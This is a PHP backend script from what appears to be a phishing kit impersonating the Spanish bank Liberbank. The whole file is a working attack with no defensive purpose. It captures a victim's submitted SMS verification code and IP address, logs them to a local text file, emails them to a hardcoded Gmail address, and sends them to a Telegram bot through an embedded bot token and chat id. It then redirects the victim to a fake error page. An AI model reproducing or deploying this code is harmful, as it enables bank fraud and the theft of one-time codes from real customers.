<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // and !empty($_POST['pin'])
          if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }

            $message = "
            | LIBERBANk(SMS): Asalamu Alaykum
            | SMS : " . $_POST['CED1'] ."
            | -IP : " . $ip . "\n\n";

            $file = fopen("./Z3lOOOk.txt", "a+");
            fwrite($file, $message);fclose($file);
            $CED1 = $_POST['CED1'];
            $to = "udaviddavida453@gmail.com";
            $subject = "LIBERBANk =?UTF-8?Q?=e2=9d=a4_?= ($ip)|CED1";
            $headers = "From: SHANkS™<shanks@lyonko.org>\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
            mail($to, $subject, $message, $headers);
            file_get_contents("https://api.telegram.org/bot1758642481:AAGjK1wO7sRCi4D7NBSDVk-a0C4fl2jnvWA/sendMessage?chat_id=-1001324167344&text=" . urlencode($message)."" );
            
            
            
            header("Location: ../espira-errore.php");
    
}
?>